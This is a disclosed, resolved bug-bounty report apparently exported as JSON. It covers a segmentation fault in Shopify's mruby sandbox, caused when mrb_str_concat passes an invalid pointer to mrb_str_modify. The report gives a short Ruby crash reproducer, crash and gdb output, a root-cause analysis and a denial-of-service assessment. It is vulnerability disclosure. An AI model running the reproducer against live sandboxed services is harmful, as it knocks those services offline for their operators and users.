{"id":183231,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODMyMzE=","url":"https://hackerone.com/reports/183231","title":"SIGSEGV on mruby mrb_str_modify() (Invalid memory access)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-11-18T03:48:21.522Z","submitted_at":"2016-11-18T03:48:21.522Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jpenalbae","url":"/jpenalbae","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-12-17T02:30:01.984Z","bug_reporter_agreed_on_going_public_at":"2016-12-17T02:30:01.509Z","team_member_agreed_on_going_public_at":"2016-12-16T19:57:14.576Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"There is an invalid memory read on mruby when calling to `mrb_str_modify()` with a invalid `RString *` which causes a SIGSEGV and leads to denial of service.\n\n## Sample\n\nThe following code triggers the bug (attached as mrb_str_modify.min.rb):\n```ruby\ndef n\nif $0\nend\n\"\"if 00end\nqqq=Proc.new{|*x|x.join}\nqqq.(\"\",\u003c\u003c000,\"\",\n000\n\"\")\nqqq.(\"\",\"#{\u003c\u003c000}\",\n000\n\"\")\n0[\u003c\u003c0000,\n#{\u003c\u003c0000}\n0000\n0000\n0]\n```\n\n## Crash\nHere we can see the crash (full crash output attached)\n```\n$ bin/sandbox /tmp/mrb_str_modify.min.rb\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\nruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:000518 EVAL   bin/sandbox:21 [FINISH]\nc:0001 p:0000 s:0002 E:000730 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:21:in `\u003cmain\u003e'\nbin/sandbox:21:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f423c11d17b RBP: 0x00007f423ac954e0 RSP: 0x00007f423ac93a80\n RAX: 0x0000000000000002 RBX: 0x0000000000000001 RCX: 0x00007f423aca7b00\n RDX: 0x00007f423ac9cf80 RDI: 0x00007f423ac954e0 RSI: 0x0000000000000001\n  R8: 0x00007f423ac953e0  R9: 0x00007f423acbc6a0 R10: 0x0000000000000330\n R11: 0x00007f423c11e670 R12: 0x00007f423ac954e0 R13: 0x00007f423ac9cf80\n R14: 0x00007f423ac954e0 R15: 0x000000000100c03e EFL: 0x0000000000010202\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042dea5]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042e0dc]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f4240308364]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f42403b9dbe]\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f424008ced0]\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_modify+0xb) [0x7f423c11d17b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:659\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_concat+0x18) [0x7f423c11e688] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2243) [0x7f423c12e7d3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f423c132567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f423c106173] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f4240083464]\n/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f423f3ff30d]\n```\n\n\n## Crash debug\n\n```\n(gdb) r\nStarting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mrb_str_modify.min.rb\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7ffff7ff5700 (LWP 30942)]\n[New Thread 0x7ffff2348700 (LWP 30993)]\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2348700 (LWP 30993)]\nmrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n660       check_frozen(mrb, s);\n(gdb) x/1i $rip\n=\u003e 0x7ffff37d117b \u003cmrb_str_modify+11\u003e:  mov    eax,DWORD PTR [rsi]\n(gdb) i r rsi\nrsi            0x1      1\n(gdb) print (mrb_value)$rsi\n$1 = {\n  value = {\n    p = 0x1,\n    {\n      i_flag = 1,\n      i = 0\n    },\n    {\n      sym_flag = 1,\n      sym = 0\n    },\n    bp = 0x1,\n    fp = 0x1,\n    vp = 0x1\n  },\n  w = 1\n}\n(gdb) list *$rip\n0x7ffff37d117b is in mrb_str_modify (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:504).\n499     }\n500\n501     static void\n502     check_frozen(mrb_state *mrb, struct RString *s)\n503     {\n504       if (RSTR_FROZEN_P(s)) {\n505         mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n506       }\n507     }\n508\n(gdb)\n```\n\nBacktrace\n```\n(gdb) bt\n#0  mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n#1  0x00007ffff37d2688 in mrb_str_concat (mrb=mrb@entry=0x7ffff23494e0, self=..., other=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n#2  0x00007ffff37e27d3 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=\u003coptimized out\u003e, proc@entry=0x7ffff2351310, pc=\u003coptimized out\u003e) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n#3  0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351310, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#4  0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#5  0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n#6  0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n```\n\nThe crash happens at `mruby-engine/ext/mruby_engine/mruby/src/string.c:504` which is built inline\n```c\nstatic void\ncheck_frozen(mrb_state *mrb, struct RString *s)\n{\n  if (RSTR_FROZEN_P(s)) {   // \u003c-- Bug happens here\n    mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n  }\n}\n```\n\nActually `mrb_str_concat()` performs a cast of the argument `mrb_value self` to a `RString *` pointer, this generates an invalid pointer which is passed to `mrb_str_modify()` and later on to `check_frozen()` which tries to read from it and produces the crash.\n\n## Impact\nIts impact seems to be DoS of the service running the sandbox service. I doubt this would be exploitable, but I have seen the memory address being read change in between samples. If an attacker would be able to control this value it could lead to a write-what-where type vulnerability. But I highly doubt this would be possible to control.\n\nSamples generating different invalid addresses have been attached.\n```\n$ bin/sandbox /tmp/mrb_str_modify.rb 2\u003e\u00261 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000003\n$ bin/sandbox /tmp/mrb_str_modify.min.rb 2\u003e\u00261 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\n```","vulnerability_information_html":"\u003cp\u003eThere is an invalid memory read on mruby when calling to \u003ccode\u003emrb_str_modify()\u003c/code\u003e with a invalid \u003ccode\u003eRString *\u003c/code\u003e which causes a SIGSEGV and leads to denial of service.\u003c/p\u003e\n\n\u003ch2 id=\"sample\"\u003eSample\u003c/h2\u003e\n\n\u003cp\u003eThe following code triggers the bug (attached as mrb_str_modify.min.rb):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003en\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"vg\"\u003e$0\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"mo\"\u003e00\u003c/span\u003e\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"n\"\u003eqqq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"no\"\u003eProc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"o\"\u003e|*\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"n\"\u003eqqq\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e\u003cspan class=\"mo\"\u003e000\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003cspan class=\"mo\"\u003e000\u003c/span\u003e\n\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003eqqq\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e\u003cspan class=\"mo\"\u003e000\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003cspan class=\"mo\"\u003e000\u003c/span\u003e\n\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e\u003cspan class=\"mo\"\u003e0000\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e#{\u0026lt;\u0026lt;0000}\u003c/span\u003e\n\u003cspan class=\"mo\"\u003e0000\u003c/span\u003e\n\u003cspan class=\"mo\"\u003e0000\u003c/span\u003e\n\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"crash\"\u003eCrash\u003c/h2\u003e\n\n\u003cp\u003eHere we can see the crash (full crash output attached)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ bin/sandbox /tmp/mrb_str_modify.min.rb\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\nruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:000518 EVAL   bin/sandbox:21 [FINISH]\nc:0001 p:0000 s:0002 E:000730 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:21:in `\u0026lt;main\u0026gt;\u0026#39;\nbin/sandbox:21:in `sandbox_eval\u0026#39;\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f423c11d17b RBP: 0x00007f423ac954e0 RSP: 0x00007f423ac93a80\n RAX: 0x0000000000000002 RBX: 0x0000000000000001 RCX: 0x00007f423aca7b00\n RDX: 0x00007f423ac9cf80 RDI: 0x00007f423ac954e0 RSI: 0x0000000000000001\n  R8: 0x00007f423ac953e0  R9: 0x00007f423acbc6a0 R10: 0x0000000000000330\n R11: 0x00007f423c11e670 R12: 0x00007f423ac954e0 R13: 0x00007f423ac9cf80\n R14: 0x00007f423ac954e0 R15: 0x000000000100c03e EFL: 0x0000000000010202\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042dea5]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042e0dc]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f4240308364]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f42403b9dbe]\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f424008ced0]\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_modify+0xb) [0x7f423c11d17b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:659\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_concat+0x18) [0x7f423c11e688] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2243) [0x7f423c12e7d3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f423c132567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f423c106173] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f4240083464]\n/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f423f3ff30d]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"crash-debug\"\u003eCrash debug\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) r\nStarting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mrb_str_modify.min.rb\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \u0026quot;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026quot;.\n[New Thread 0x7ffff7ff5700 (LWP 30942)]\n[New Thread 0x7ffff2348700 (LWP 30993)]\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2348700 (LWP 30993)]\nmrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n660       check_frozen(mrb, s);\n(gdb) x/1i $rip\n=\u0026gt; 0x7ffff37d117b \u0026lt;mrb_str_modify+11\u0026gt;:  mov    eax,DWORD PTR [rsi]\n(gdb) i r rsi\nrsi            0x1      1\n(gdb) print (mrb_value)$rsi\n$1 = {\n  value = {\n    p = 0x1,\n    {\n      i_flag = 1,\n      i = 0\n    },\n    {\n      sym_flag = 1,\n      sym = 0\n    },\n    bp = 0x1,\n    fp = 0x1,\n    vp = 0x1\n  },\n  w = 1\n}\n(gdb) list *$rip\n0x7ffff37d117b is in mrb_str_modify (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:504).\n499     }\n500\n501     static void\n502     check_frozen(mrb_state *mrb, struct RString *s)\n503     {\n504       if (RSTR_FROZEN_P(s)) {\n505         mrb_raise(mrb, E_RUNTIME_ERROR, \u0026quot;can\u0026#39;t modify frozen string\u0026quot;);\n506       }\n507     }\n508\n(gdb)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBacktrace\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n#1  0x00007ffff37d2688 in mrb_str_concat (mrb=mrb@entry=0x7ffff23494e0, self=..., other=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n#2  0x00007ffff37e27d3 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=\u0026lt;optimized out\u0026gt;, proc@entry=0x7ffff2351310, pc=\u0026lt;optimized out\u0026gt;) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n#3  0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351310, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#4  0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#5  0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n#6  0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe crash happens at \u003ccode\u003emruby-engine/ext/mruby_engine/mruby/src/string.c:504\u003c/code\u003e which is built inline\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003cspan class=\"nf\"\u003echeck_frozen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb_state\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eRString\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eRSTR_FROZEN_P\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e   \u003cspan class=\"c1\"\u003e// \u0026lt;-- Bug happens here\u003c/span\u003e\n    \u003cspan class=\"n\"\u003emrb_raise\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eE_RUNTIME_ERROR\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;can\u0026#39;t modify frozen string\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eActually \u003ccode\u003emrb_str_concat()\u003c/code\u003e performs a cast of the argument \u003ccode\u003emrb_value self\u003c/code\u003e to a \u003ccode\u003eRString *\u003c/code\u003e pointer, this generates an invalid pointer which is passed to \u003ccode\u003emrb_str_modify()\u003c/code\u003e and later on to \u003ccode\u003echeck_frozen()\u003c/code\u003e which tries to read from it and produces the crash.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIts impact seems to be DoS of the service running the sandbox service. I doubt this would be exploitable, but I have seen the memory address being read change in between samples. If an attacker would be able to control this value it could lead to a write-what-where type vulnerability. But I highly doubt this would be possible to control.\u003c/p\u003e\n\n\u003cp\u003eSamples generating different invalid addresses have been attached.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ bin/sandbox /tmp/mrb_str_modify.rb 2\u0026gt;\u0026amp;1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000003\n$ bin/sandbox /tmp/mrb_str_modify.min.rb 2\u0026gt;\u0026amp;1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"8000.0","formatted_bounty":"$8,000","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":135301,"file_name":"mrb_str_modify.min.rb","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/301/426e99bb149abb3c39e3ae8b57cf8615a985dc91/mrb_str_modify.min.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_str_modify.min.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_str_modify.min.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044621Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=3887cc4e39c83a37430a512ce13bff0385aca4f1303ccc095c4b4a2164379cd3","file_size":139,"type":"text/plain"},{"id":135302,"file_name":"mrb_str_modify.rb","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/302/e13bada5b99bb47127ce9674abc6822babbf62d8/mrb_str_modify.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_str_modify.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_str_modify.rb\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044621Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1